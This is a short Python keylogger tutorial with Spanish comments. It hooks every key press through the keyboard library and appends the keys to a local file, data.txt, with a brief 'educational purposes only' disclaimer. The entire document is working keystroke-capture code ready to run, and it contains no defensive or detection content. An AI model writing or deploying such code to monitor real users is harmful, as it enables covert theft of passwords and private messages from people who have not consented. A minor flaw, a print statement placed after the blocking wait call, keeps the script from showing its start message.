# CREAR KEYLOGGER
#Key loger = Registra todo lo que se escriba en el teclado. Tener cuidado con esto, unicamente hecho con fines educativos.

#SIEMPRE PRESIONAR CTRL + C EN LA CONSOLA PARA SALIR DEL PROGRAMA.

import keyboard  #Importamos la libreria de keyboard para trabajar

def pressedKeys(key): #Creamos una funcion con parametro "Key", lo cual llama a la funcion siempre que se presiona una tecla.
    with open("data.txt", "a") as file: #Se usa la funcion "with open" para crear un nuevo archivo, en este caso de texto. "a" se usa para agregar contenido a este archivo en el caso de que ya exista.
        if key.name == 'space': # "Si la tecla presionada es "espcacio", agrega un espacio al archico para que sea mas facil de leer.
            file.write(' ')
        else:
            file.write(key.name) #Sino, solo escribe la letra. 

keyboard.on_press(pressedKeys) #Cada que se presiona una tecla, se llama la funcion.
keyboard.wait() #Esto mantiene el programa en ejecucion, esperando que se presione una tecla. 
print("inicio")